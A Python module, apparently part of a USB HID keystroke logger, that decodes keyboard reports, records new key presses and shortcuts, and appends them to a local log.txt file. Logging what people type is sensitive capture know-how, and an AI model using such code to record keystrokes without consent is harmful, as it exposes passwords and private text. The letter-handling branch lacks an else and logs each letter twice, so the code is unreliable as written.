from mapper import HIDDecoder, mod_map
decoder = HIDDecoder()

LETTER_KEYS = set(range(4, 30))  # a-z

class ModKeys:
    def __init__(self, mod_keys):
        self.shift = False
        self.alt = False
        self.ctrl = False
        self.win = False
        self.any = False
        self._init_mods(mod_keys)
    
    def _init_mods(self, mod_keys):
        for code in mod_keys:
            if code == -0x01 or code == -0x10:  # left_ctrl or right_ctrl
                self.ctrl = True
            elif code == -0x02 or code == -0x20:  # left_shift or right_shift
                self.shift = True
            elif code == -0x04 or code == -0x40:  # left_alt or right_alt
                self.alt = True
            elif code == -0x08 or code == -0x80:  # left_ui or right_ui
                self.win = True

class Log:
    def __init__(self, size, key_lock):
        self.path = "log.txt"
        self.size = size
        self.buffer = []
        self.last_state = set()
        self.lock = key_lock
    
    def _get_press(self, modifiers, keys) -> str:
        """Get pressed key in string"""
        if not modifiers and not keys:
            self.last_state.clear()
            return ""
        if not keys:
            self.last_state.clear()
            return ""
        mod = ModKeys(modifiers)
        newly_pressed_keys = set(keys) - self.last_state
        self.last_state = set(keys)
        
        # No new keys pressed
        if not newly_pressed_keys:
            return ""
        
        # Shortcut detected
        if mod.ctrl or mod.alt or mod.win:
            self.last_state.clear()
            parts = []
            # Add all currently held modifiers
            for code in modifiers:
                parts.append(decoder.decode(code))
            for code in newly_pressed_keys:
                parts.append(decoder.decode(code))
            return "[" + "+".join(parts) + "]"

        # Regular typing with shift/caps logic
        result = []
        for key_code in newly_pressed_keys:
            # Letter Keys
            if key_code in LETTER_KEYS:
                if mod.shift != self.lock.caps_lock:
                    result.append(decoder.decode(key_code, shift=True))
                else:
                    result.append(decoder.decode(key_code))
            # Not Letter Keys
            result.append(decoder.decode(key_code, mod.shift))
        return "".join(result)

    def _flush(self):
        if not self.buffer:
            return
        string = "".join(self.buffer)
        file = open(self.path, "a")
        file.write(string)
        self.buffer.clear()
        file.close()

    def add(self, modifiers, keys):
        # Flush when buffer reaches size limit
        if len(self.buffer) >= self.size:
            self._flush()
        # Then add to buffer
        press_str = self._get_press(modifiers, keys)
        if press_str:
            self.buffer.append(press_str)
